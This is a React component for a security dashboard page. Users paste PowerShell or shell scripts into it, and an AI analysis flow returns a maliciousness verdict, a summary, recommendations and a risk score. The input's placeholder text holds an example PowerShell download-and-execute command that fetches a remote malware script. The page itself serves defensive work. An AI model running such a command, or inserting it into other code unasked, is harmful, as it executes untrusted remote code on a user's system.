'use client';
import { useState } from 'react';
import { Card, CardHeader, CardTitle, CardContent, CardDescription, CardFooter } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { useToast } from '@/hooks/use-toast';
import { analyzeScript, AnalyzeScriptOutput } from '@/ai/flows/analyze-script-flow';
import { Loader2, AlertTriangle, ShieldCheck, FileWarning } from 'lucide-react';
import { Badge } from '@/components/ui/badge';

export function MLAnalysis() {
    const [script, setScript] = useState('');
    const [loading, setLoading] = useState(false);
    const [result, setResult] = useState<AnalyzeScriptOutput | null>(null);
    const { toast } = useToast();

    const handleAnalyze = async () => {
        if (!script.trim()) {
            toast({
                variant: 'destructive',
                title: 'Error',
                description: 'Script content cannot be empty.',
            });
            return;
        }

        setLoading(true);
        setResult(null);

        try {
            const analysisResult = await analyzeScript({ script });
            setResult(analysisResult);
        } catch (error) {
            console.error("Script analysis failed:", error);
            toast({
                variant: "destructive",
                title: "Analysis Error",
                description: "Failed to analyze the script. Please try again.",
            });
        } finally {
            setLoading(false);
        }
    };
    
    const getRiskBadgeVariant = (score: number): "destructive" | "secondary" | "outline" => {
        if (score > 75) return 'destructive';
        if (score > 40) return 'secondary';
        return 'outline';
    };

    return (
        <main className="flex flex-1 flex-col gap-4 p-4 md:gap-8 md:p-8">
            <header>
                <h1 className="text-3xl font-bold tracking-tight">ML Analysis</h1>
                <p className="text-muted-foreground">
                    Leverage machine learning to analyze suspicious scripts and commands.
                </p>
            </header>
            <div className="grid gap-6 lg:grid-cols-2">
                <Card>
                    <CardHeader>
                        <CardTitle>Analyze Script</CardTitle>
                        <CardDescription>Paste your PowerShell or shell script here to get an AI-powered security analysis.</CardDescription>
                    </CardHeader>
                    <CardContent>
                        <div className="grid w-full gap-2">
                            <Textarea 
                                placeholder="e.g., iex (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')" 
                                className="h-48 font-mono"
                                value={script}
                                onChange={(e) => setScript(e.target.value)}
                            />
                            <Button onClick={handleAnalyze} disabled={loading}>
                                {loading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                                {loading ? 'Analyzing...' : 'Analyze with ML Model'}
                            </Button>
                        </div>
                    </CardContent>
                </Card>

                <div className="flex items-center justify-center">
                    {loading && (
                         <Card className="w-full h-full flex flex-col items-center justify-center">
                             <CardContent className="text-center p-6">
                                <Loader2 className="h-10 w-10 animate-spin text-primary mb-4" />
                                <p className="font-semibold">Analyzing Script...</p>
                                <p className="text-sm text-muted-foreground">The AI model is reviewing the code.</p>
                             </CardContent>
                         </Card>
                    )}
                    {!loading && result && (
                        <Card className="w-full">
                            <CardHeader>
                                <CardTitle className="flex items-center gap-3">
                                    {result.isMalicious ? <FileWarning className="h-8 w-8 text-destructive" /> : <ShieldCheck className="h-8 w-8 text-primary" />}
                                    <span>Analysis Result</span>
                                </CardTitle>
                                <CardDescription>
                                    {result.isMalicious ? 'This script has been identified as potentially malicious.' : 'This script appears to be safe.'}
                                </CardDescription>
                            </CardHeader>
                            <CardContent className="grid gap-4">
                                <div>
                                    <h4 className="font-semibold mb-1">Summary</h4>
                                    <p className="text-sm text-muted-foreground">{result.summary}</p>
                                </div>
                                <div>
                                    <h4 className="font-semibold mb-1">Recommendations</h4>
                                    <p className="text-sm text-muted-foreground">{result.recommendations}</p>
                                </div>
                            </CardContent>
                            <CardFooter className="flex justify-between items-center bg-muted/50 p-3 rounded-b-lg">
                                <div className="flex items-center gap-2">
                                     <AlertTriangle className="h-5 w-5" />
                                     <span className="text-sm font-semibold">Risk Score</span>
                                </div>
                               <Badge variant={getRiskBadgeVariant(result.riskScore)} className="text-lg px-3 py-1">
                                    {result.riskScore} / 100
                                </Badge>
                            </CardFooter>
                        </Card>
                    )}
                     {!loading && !result && (
                        <Card className="w-full h-full flex flex-col items-center justify-center border-dashed">
                            <CardContent className="text-center p-6">
                                <p className="text-muted-foreground">Analysis results will appear here.</p>
                            </CardContent>
                        </Card>
                    )}
                </div>
            </div>
        </main>
    )
}
